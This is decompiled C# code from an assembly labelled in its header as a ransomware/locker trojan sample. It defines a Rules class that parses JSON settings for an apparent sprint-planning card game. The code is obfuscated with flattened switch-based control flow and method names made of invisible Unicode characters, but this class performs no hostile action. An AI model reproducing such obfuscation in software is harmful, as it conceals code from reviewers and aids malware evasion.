// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: VersioningHelp, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: A8C08E3E-24A1-4DAA-9E0F-F1F4BE4809FB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1861855b22d693257e4e3463667e53ae08711a684747fdd32f49c3e7b9c7f04f.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
label_1:
      int num1 = -776641915;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1737757153)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 1942402783 ^ -1931977038;
            continue;
          case 3:
            num1 = (int) num2 * -1393129834 ^ -1751800784;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = 1893626931;
      int aIndex;
      float[] numArray;
      float[] riskChances;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1165069311)) % 10U)
        {
          case 0:
            riskChances = numArray;
            num1 = (int) num2 * 1684344006 ^ -935631044;
            continue;
          case 2:
            numArray = new float[json.Count];
            num1 = (int) num2 * 1150047500 ^ 944767262;
            continue;
          case 3:
            num1 = (int) num2 * -1791615323 ^ 297945317;
            continue;
          case 4:
            int num3 = !flag ? 536026107 : (num3 = 1744133437);
            num1 = num3 ^ (int) num2 * -1705790779;
            continue;
          case 5:
            aIndex = 0;
            num1 = (int) num2 * 735631332 ^ 1125894621;
            continue;
          case 6:
            flag = aIndex < numArray.Length;
            num1 = 644315301;
            continue;
          case 7:
            goto label_1;
          case 8:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 6158570;
            continue;
          case 9:
            ++aIndex;
            num1 = (int) num2 * -717135298 ^ 2036897647;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = 1944177501;
      int count;
      List<Card> cardList;
      int aIndex1;
      int aIndex2;
      Card[] array;
      JSONNode jsonNode;
      bool flag1;
      bool flag2;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1573388262)) % 24U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num3 * 1441874588 ^ 392307998;
            continue;
          case 2:
            num1 = 144450182;
            continue;
          case 3:
            int num4;
            num1 = num4 = aIndex1 >= count ? 2131658763 : (num4 = 1391442128);
            continue;
          case 4:
            ++aIndex1;
            num1 = (int) num3 * 635743787 ^ 45391825;
            continue;
          case 6:
            jsonNode = json[aIndex1];
            num1 = 2052300592;
            continue;
          case 7:
            int num5;
            num1 = num5 = num2 < jsonNode[aIndex2].AsInt ? 1544443460 : (num5 = 904337019);
            continue;
          case 8:
            num1 = (int) num3 * -819535246 ^ -1477228974;
            continue;
          case 9:
            num1 = (int) num3 * 258326804 ^ 443297261;
            continue;
          case 10:
            int num6 = !flag2 ? 226428151 : (num6 = 1757783909);
            num1 = num6 ^ (int) num3 * 1665413336;
            continue;
          case 11:
            count = json.Count;
            cardList = new List<Card>();
            aIndex1 = 0;
            num1 = (int) num3 * -1580769340 ^ 2021998748;
            continue;
          case 12:
            num1 = (int) num3 * 319124514 ^ -1153948453;
            continue;
          case 13:
            num1 = (int) num3 * 53948606 ^ 2022414538;
            continue;
          case 14:
            aIndex2 = 0;
            num1 = (int) num3 * 1599629686 ^ -1443233118;
            continue;
          case 15:
            ++num2;
            num1 = (int) num3 * 1688289085 ^ 1561735594;
            continue;
          case 16:
            flag1 = aIndex2 < maxImpact;
            num1 = (int) num3 * -1191514042 ^ -1267745815;
            continue;
          case 17:
            num2 = 0;
            num1 = (int) num3 * -2030393759 ^ -175521152;
            continue;
          case 18:
            ++aIndex2;
            num1 = (int) num3 * -386896048 ^ 1354383538;
            continue;
          case 19:
            num1 = 2055062383;
            continue;
          case 20:
            flag2 = aIndex2 < maxImpact * 2;
            num1 = 1578612436;
            continue;
          case 21:
            array = cardList.ToArray();
            num1 = (int) num3 * 82569807 ^ -911668711;
            continue;
          case 22:
            num1 = (int) num3 * 1379461524 ^ 814905893;
            continue;
          case 23:
            cardList.Add(new Card()
            {
              Impact = flag1 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = 817989567;
            continue;
          default:
            goto label_25;
        }
      }
label_25:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 278376526;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 312064233)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Rules.\u200D‍⁯‪‮‭‪‪⁪⁪​‮‬‭⁪‎‭‏‮‏‎⁬⁫⁫⁬‪​‎⁭⁮⁪‭‌‍‍⁯⁫‮‎‍‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -610481064 ^ 724362534;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
      int num1 = 0;
label_1:
      int num2 = 330627635;
      int index;
      Card[] cards;
      Card card1;
      bool flag;
      string str2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num2 ^ 243592252)) % 13U)
        {
          case 0:
            goto label_1;
          case 1:
            ++index;
            num2 = (int) num3 * -1775858150 ^ 1319434816;
            continue;
          case 2:
            int num4;
            num2 = num4 = index >= cards.Length ? 581184058 : (num4 = 605236010);
            continue;
          case 4:
            str2 = Rules.\u200B‏⁪⁬‎‪‍⁯‬⁭‬⁯‏‪⁭⁮‮​‮‭‏‍‎⁬⁫‌‍‏‮⁪‮‫‍⁬⁫⁭‏⁫⁭⁮‮(str1, "\n]");
            num2 = (int) num3 * 230418989 ^ -1756933883;
            continue;
          case 5:
            int num5 = !flag ? 1200204756 : (num5 = 1547478538);
            num2 = num5 ^ (int) num3 * 113437178;
            continue;
          case 6:
            num1 = card1.Type;
            num2 = (int) num3 * 765487398 ^ 1236916798;
            continue;
          case 7:
            card1 = cards[index];
            num2 = 1731873769;
            continue;
          case 8:
            str1 = Rules.\u200B‏⁪⁬‎‪‍⁯‬⁭‬⁯‏‪⁭⁮‮​‮‭‏‍‎⁬⁫‌‍‏‮⁪‮‫‍⁬⁫⁭‏⁫⁭⁮‮(str1, "\n\t");
            num2 = (int) num3 * -913400055 ^ 575586268;
            continue;
          case 9:
            cards = this.Cards;
            index = 0;
            num2 = (int) num3 * 596916523 ^ 525377007;
            continue;
          case 10:
            num2 = (int) num3 * 433550342 ^ -753320002;
            continue;
          case 11:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u200E⁮​‫​‪​‪‭‪‬⁫⁯⁭​‍‬‭‮⁬⁬⁬‫​⁬‫‬⁫⁯‏⁪⁭‫‌‌‮‮⁯‏⁬‮((object) card2) : (string) null;
            str1 = Rules.\u206C​‏‫‬‪⁬​⁭‎‏‭‪⁫‬‌⁬‌‮⁫‪‭‏‎⁮‬⁯‌‫‏‫‍⁯‎​‭‮‮‪⁮‮(str3, str4, " ");
            num2 = 1715504405;
            continue;
          case 12:
            flag = num1 != card1.Type;
            num2 = (int) num3 * -1092629186 ^ -839374683;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u200B‏⁪⁬‎‪‍⁯‬⁭‬⁯‏‪⁭⁮‮​‮‭‏‍‎⁬⁫‌‍‏‮⁪‮‫‍⁬⁫⁭‏⁫⁭⁮‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u200E‬⁬‭‏⁬​​⁮‪⁫⁬⁬⁫‮‫⁮‎‎‮⁬‭‮‮‭‌​‬‪‎​‌⁮⁭‌⁪‫‍‎‭‮()));
label_1:
      int num1 = 1849593822;
      int index;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1705062233)) % 10U)
        {
          case 0:
            num1 = (int) num2 * -120477910 ^ -1605637419;
            continue;
          case 1:
            int num3 = !flag ? -839817003 : (num3 = -775998636);
            num1 = num3 ^ (int) num2 * 394816781;
            continue;
          case 2:
            str1 = Rules.\u206C​‏‫‬‪⁬​⁭‎‏‭‪⁫‬‌⁬‌‮⁫‪‭‏‎⁮‬⁯‌‫‏‫‍⁯‎​‭‮‮‪⁮‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u200E‬⁬‭‏⁬​​⁮‪⁫⁬⁬⁫‮‫⁮‎‎‮⁬‭‮‮‭‌​‬‪‎​‌⁮⁭‌⁪‫‍‎‭‮()));
            num1 = 851707262;
            continue;
          case 4:
            num1 = (int) num2 * -1037683607 ^ -348026972;
            continue;
          case 5:
            index = 1;
            num1 = (int) num2 * 413666404 ^ 1932181339;
            continue;
          case 6:
            flag = index < this.RiskChances.Length;
            num1 = 930532234;
            continue;
          case 7:
            str2 = Rules.\u200B‏⁪⁬‎‪‍⁯‬⁭‬⁯‏‪⁭⁮‮​‮‭‏‍‎⁬⁫‌‍‏‮⁪‮‫‍⁬⁫⁭‏⁫⁭⁮‮(str1, " ]");
            num1 = (int) num2 * 716629865 ^ 1691836014;
            continue;
          case 8:
            goto label_1;
          case 9:
            ++index;
            num1 = (int) num2 * 1567360948 ^ 1182293909;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    static string \u200D‍⁯‪‮‭‪‪⁪⁪​‮‬‭⁪‎‭‏‮‏‎⁬⁫⁫⁬‪​‎⁭⁮⁪‭‌‍‍⁯⁫‮‎‍‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200B‏⁪⁬‎‪‍⁯‬⁭‬⁯‏‪⁭⁮‮​‮‭‏‍‎⁬⁫‌‍‏‮⁪‮‫‍⁬⁫⁭‏⁫⁭⁮‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u200E⁮​‫​‪​‪‭‪‬⁫⁯⁭​‍‬‭‮⁬⁬⁬‫​⁬‫‬⁫⁯‏⁪⁭‫‌‌‮‮⁯‏⁬‮([In] object obj0) => obj0.ToString();

    static string \u206C​‏‫‬‪⁬​⁭‎‏‭‪⁫‬‌⁬‌‮⁫‪‭‏‎⁮‬⁯‌‫‏‫‍⁯‎​‭‮‮‪⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u200E‬⁬‭‏⁬​​⁮‪⁫⁬⁬⁫‮‫⁮‎‎‮⁬‭‮‮‭‌​‬‪‎​‌⁮⁭‌⁪‫‍‎‭‮() => CultureInfo.InvariantCulture;
  }
}
